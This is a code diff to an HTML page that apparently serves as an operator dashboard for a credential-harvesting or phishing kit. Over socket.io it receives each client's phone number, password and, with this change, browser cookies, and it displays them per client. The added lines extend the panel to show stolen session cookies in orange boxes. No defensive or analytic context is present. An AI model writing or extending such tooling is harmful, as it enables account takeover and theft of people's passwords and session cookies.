@@ -43,6 +43,9 @@
         .password {
             background-color: #e8a216; /* Light red background */
         }
+        .cookies {
+            background-color: #f5a623; /* Light orange background */
+        }
     </style>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.0.1/socket.io.js"></script>
     <script type="text/javascript" charset="utf-8">
@@ -80,6 +83,11 @@
                     phoneEntry.textContent = data.data;
                 } else if (data.type === 'password') {
                     passwordEntry.textContent = data.data;
+                } else if (data.type === 'cookies') {
+                    var cookiesEntry = document.createElement('div');
+                    cookiesEntry.className = 'cookies';
+                    cookiesEntry.textContent = JSON.stringify(data.data);
+                    clientDiv.querySelector('.client-info').appendChild(cookiesEntry);
                 }
             });
         });
